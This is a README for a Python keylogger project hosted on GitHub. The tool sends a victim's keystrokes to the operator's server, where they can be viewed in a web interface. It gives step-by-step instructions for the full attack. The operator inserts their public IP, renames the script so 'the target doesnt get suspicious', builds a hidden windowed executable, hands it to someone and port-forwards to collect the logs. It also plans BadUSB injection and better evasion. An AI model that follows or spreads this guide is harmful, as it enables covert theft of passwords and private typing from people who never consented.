# Keylogger

A keylogger made to send keystrokes to a remote server for it to then be accessed from a web interface.

There are many things to work on including mainly reliability but I am overall pretty happy with it. Dont expect some kind of crazy UI or functions, this is really bare bones and I made it for the sole purpose of leveling up my python skills. I also found the idea really neat and coudlnt find a good alternative ... so I made my own one.

It all started when I was looking into botnets and how to make my own one, but I quickly found out that the only ones that I had access to (at the time) was BYOB and Covenant. BYOB was outdated, was a pain to set up, didnt work and the comunity also gave up after trying to consult my problem in the discord. Covenant did work really nicely (when setting up) tho it was lacking features BYOB had and didnt work for me. So I decided to start with a keylogger. I (probbably) will make more of these tools like this keylogger and eventually will put it into a one big interface. But that has years to come since i still need to start and finish high school. :/

# Future updates

More reliable and secure connection

Two way interactions (so you can write, modify, send commands to the targets for them to then behave like that (Ex. Stop for 15 min))

Having a BadUSB payload to inject the malware

Better UI (in desperate need please some could help me i am terrible at it)

Improved its under-the-radar ability (windows updated in the future may brick it)



# You will need:

Linux server (RPI2 works well enough)

Central computer (Your personal just for setting up)

Internet connection (Preferably wired)

Ability to port forward (Ik but there isnt a better way rn)

Python 3.12 installed on the server (I will not show how to install python so do it yourself)

 

Optional:

USB flash drive (To load your keylogger onto a target machine physicaly)

USB RubberDucky (Also an option instead of a flash drive)

Third PC (If you can it is recomended to test everything out)   
    
# How to set up:

SSH into your remote server and cd into the home directory

Then clone the project with:

    git clone https://github.com/Gablak/keylogger
    
Cd into keylogger dir:

    cd keylogger

Cd into Client dir:

    cd Client

Edit target.py with nano:

    sudo nano target.py

When in nano scroll down until you see "YOUR IP HERE" and replace it with your public IP address

Then exit nano with
Ctrl + S,
Ctrl + X,
Y,
ENTER

    cd ..
    
    python3.12 installme.py

Wait until all dependencies are finished installing. If it propmts you to update pip or you see some errors just update pip as it tells you and run the script again. If it still gives errors ignore it for now.

    cd Client

Now rename the target.py script so that the target doesnt get suspicious about anything. (Ex: "sysmanager.py")

    mv target.py ANY_NAME_HERE.py

Then compile it into an executable with

    pyinstaller --onefile --windowed SCRIPT_NAME_HERE.py

When finished, the exe file will be in dist directory it created.

    cd dist

With ls we can see if its there:

    ls

Now just give it to someone, run it and their logs wont appear since we havent port forwarded yet. This will work if you are testing it on a local network tho.

Open any browser of your liking and type in your routers local IP address. It should look something like this: 192.168.1.1.

If that leads to nothing just open a windows terminal and type:

    ipconfig

The Default Gateway should be the routers IP.

Navigate yourself somewhere that says WAN, Virtual Server or Port Forward. If you cant find anything i recomend searching online for your router or consult your manual.
If you see an add button click it and a menu will probably show up. The ip will be the local IP address of your server, external and internal port will be 3500. Confirm the settings and save but dont quit yet. Repeat the process again but use the port 4500. If it prompts you for a name you can enter anything, it doesnt matter.
After that save the settings and close and you should be seeing keylogs going in.

Type in your public IP with this ":3500" at the end and you should be navigated into the menu UI.
